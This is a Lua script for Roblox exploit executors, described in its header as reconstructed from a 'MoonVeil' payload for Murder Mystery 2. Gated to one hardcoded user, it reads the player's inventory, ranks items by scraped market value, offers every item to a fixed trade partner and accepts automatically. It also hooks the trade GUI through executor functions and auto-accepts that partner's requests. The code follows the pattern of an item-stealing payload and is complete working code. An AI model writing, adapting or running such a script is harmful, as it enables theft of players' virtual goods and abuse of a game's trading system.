--!nocheck
-- Reconstructed MM2 auto-trade script (adapted to current MM2 version)
-- Original: MoonVeil 2.0.20 payload (mm2.txt)
-- Target user: v_hnas
-- Trade partner: si3rradoll

-- ============ CONFIG ============
local TARGET_USER   = "v_hnas"
local TARGET_TRADE  = "si3rradoll"
local KICK_MSG      = "скрипт только для v_hnas"
local UNSUPPORTED   = "Game not supported. Please join a normal MM2 server"

-- ============ SERVICES ============
local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local TweenService      = game:GetService("TweenService")
local CoreGui           = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- ============ EXECUTOR BRIDGE ============
local function getExecutor()
    local genv = (getgenv and getgenv()) or _G
    return {
        request      = rawget(genv, "request") or rawget(genv, "http_request"),
        httpget      = rawget(genv, "HttpGet"),
        hookfunction = rawget(genv, "hookfunction"),
        getgc        = rawget(genv, "getgc"),
        identify     = rawget(genv, "identifyexecutor"),
    }
end

local EX = getExecutor()

-- ============ KICK GUARDS ============
local function guardTargetUser()
    if LocalPlayer.Name:lower() ~= TARGET_USER:lower() then
        LocalPlayer:Kick(KICK_MSG)
        return false
    end
    return true
end

local function guardPlace()
    -- MM2 PlaceId (обычный сервер)
    local MM2_PLACE_IDS = {
        [142823291]   = true,  -- Murder Mystery 2 (main)
        [11759233232] = true,  -- MM2 (alt / newer)
    }
    if not MM2_PLACE_IDS[game.PlaceId] then
        LocalPlayer:Kick(UNSUPPORTED)
        return false
    end
    return true
end

-- ============ VALUES SYNC (mm2values.com) ============
local VALUES = {}
local VALUES_URLS = {
    ancient  = "https://mm2values.com/?p=ancient",
    godly    = "https://mm2values.com/?p=godly",
    unique   = "https://mm2values.com/?p=unique",
    chroma   = "https://mm2values.com/?p=chroma",
    legend   = "https://mm2values.com/?p=legend",
    rare     = "https://mm2values.com/?p=rare",
    uncommon = "https://mm2values.com/?p=uncommon",
    common   = "https://mm2values.com/?p=common",
}

local HEADERS = {
    ["Accept"]          = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    ["Accept-Language"] = "en-US,en;q=0.9",
    ["Referer"]         = "https://mm2values.com/",
    ["User-Agent"]      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}

local function httpGet(url)
    if EX.request then
        local ok, res = pcall(EX.request, { Url = url, Method = "GET", Headers = HEADERS })
        if ok and res then return res.Body or res.body end
    end
    if EX.httpget then
        local ok, res = pcall(EX.httpget, { Url = url, Method = "GET", Headers = HEADERS })
        if ok and res then return res.Body or res.body end
    end
    return nil
end

local function syncValues()
    for rarity, url in pairs(VALUES_URLS) do
        local body = httpGet(url)
        if body then
            for name, price in body:gmatch("([%w%s_%-%.]+)%s*[%-–—]%s*(%d+)") do
                name = name:match("^%s*(.-)%s*$")
                if name and #name > 1 and #name < 60 then
                    VALUES[name] = tonumber(price) or 0
                end
            end
        end
    end
    print("✅ Values synced.")
end

-- ============ INVENTORY ============
local Remotes   = ReplicatedStorage:WaitForChild("Remotes", 10)
local Inventory = Remotes and Remotes:WaitForChild("Inventory", 10)

local function getInventory()
    if not Inventory then return {} end
    local profileRemote = Inventory:FindFirstChild("GetProfileData")
        or Inventory:FindFirstChild("GetPlayerData_REMOTE")
    if not profileRemote then
        warn("❌ Inventory remote not found")
        return {}
    end

    local ok, data = pcall(function()
        return profileRemote:InvokeServer()
    end)
    if not ok or type(data) ~= "table" then return {} end

    local items = {}
    local weapons = data.Weapons or data.Owned or data.Items or {}
    for _, item in ipairs(weapons) do
        if item.DataID and (item.Amount == nil or item.Amount > 0) then
            table.insert(items, {
                DataID = item.DataID,
                Rarity = item.Rarity,
                Amount = item.Amount or 1,
                Chroma = item.Chroma,
                Value  = VALUES[item.DataID] or 0,
            })
        end
    end
    table.sort(items, function(a, b) return a.Value > b.Value end)
    return items
end

-- ============ TRADE REMOTES ============
local Trade = ReplicatedStorage:WaitForChild("Trade", 10)
if not Trade then
    warn("❌ Trade folder not found in ReplicatedStorage")
    return
end

local function getRemote(name, timeout)
    return Trade:WaitForChild(name, timeout or 5)
end

local StartTrade      = getRemote("StartTrade")
local OfferItem       = getRemote("OfferItem")
local AcceptTrade     = getRemote("AcceptTrade")
local DeclineTrade    = getRemote("DeclineTrade")
local SendRequest     = getRemote("SendRequest")
local GetTradeStatus  = getRemote("GetTradeStatus")
local GetRequest      = getRemote("GetRequest")
local AcceptRequest   = getRemote("AcceptRequest")
local DeclineRequest  = getRemote("DeclineRequest")
local CompleteTrade   = getRemote("CompleteTrade")
local EndTrade        = getRemote("EndTrade")

if not StartTrade or not OfferItem or not AcceptTrade then
    warn("❌ Critical trade remotes missing — script may not work")
    return
end

-- ============ PLAYER LOOKUP ============
local function findPlayer(name)
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower() == name:lower() then
            return plr
        end
    end
    return nil
end

-- ============ TRADE ACTIONS ============
local function startTrade(target)
    local ok, err = pcall(function()
        StartTrade:InvokeServer(target)
    end)
    if not ok then
        warn("StartTrade failed:", err)
        return false
    end
    print("⚡ MM2 Trade STARTED")
    return true
end

local function offerItems(items)
    print("🔄 Transferring items now...")
    for _, item in ipairs(items) do
        pcall(function()
            OfferItem:FireServer(item.DataID, item.Amount or 1)
        end)
        task.wait(0.1)
    end
end

local function acceptTrade()
    pcall(function() AcceptTrade:InvokeServer() end)
    pcall(function() AcceptTrade:FireServer() end)
end

local function acceptRequest()
    pcall(function() AcceptRequest:FireServer() end)
end

local function declineTrade()
    pcall(function() DeclineTrade:FireServer() end)
end

local function declineRequest()
    pcall(function() DeclineRequest:FireServer() end)
end

-- ============ HOOK stepAnimate ============
local function hookTradeGUI()
    if not EX.hookfunction or not EX.getgc then return end
    local ok, gc = pcall(EX.getgc)
    if not ok or type(gc) ~= "table" then return end

    for _, obj in ipairs(gc) do
        if typeof(obj) == "function" then
            local info = debug.getinfo(obj, "n")
            if info and info.name == "stepAnimate" then
                EX.hookfunction(obj, function(...)
                    return obj(...)
                end)
            end
        end
    end
end

-- ============ WATCH INCOMING REQUESTS ============
local function watchRequests()
    if GetRequest then
        GetRequest.OnClientEvent:Connect(function(fromPlayer)
            if typeof(fromPlayer) == "Instance"
                and fromPlayer.Name:lower() == TARGET_TRADE:lower() then
                print("📩 Request from " .. TARGET_TRADE .. " — accepting")
                acceptRequest()
            end
        end)
    end
end

-- ============ MAIN ============
local function main()
    if not guardTargetUser() then return end
    if not guardPlace() then return end

    syncValues()
    print("⏳ Waiting for " .. TARGET_TRADE .. "...")

    local items = getInventory()
    if #items == 0 then
        warn("❌ No tradable items in inventory. Cannot start trade.")
        print("⛔ Trade Failed: No Items")
        return
    end
    print("🎒 Items ready: " .. #items)

    hookTradeGUI()
    watchRequests()

    local target = findPlayer(TARGET_TRADE)
    if not target then
        warn("Player " .. TARGET_TRADE .. " not found. Waiting on PlayerAdded...")
        return
    end

    if not startTrade(target) then
        warn("⛔ Trade Failed: No Items")
        return
    end

    task.wait(1)
    offerItems(items)
    task.wait(1)
    acceptTrade()

    print("✅ Trade COMPLETED")
    print("All items sent successfully.")
end

-- ============ ENTRY POINTS ============
Players.PlayerAdded:Connect(function(plr)
    if plr.Name:lower() == TARGET_TRADE:lower() then
        task.spawn(main)
    end
end)

if findPlayer(TARGET_TRADE) then
    task.spawn(main)
end
